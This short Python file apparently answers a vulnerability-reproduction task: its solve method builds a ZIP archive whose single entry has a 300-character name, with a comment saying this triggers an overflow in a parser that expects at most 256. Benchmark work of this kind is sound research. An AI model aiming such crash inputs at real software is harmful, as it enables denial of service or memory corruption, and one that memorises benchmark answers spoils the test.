import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        long_name = "A" * 300  # >256 to trigger the overflow
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, mode="w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(long_name, b"")
        return buffer.getvalue()
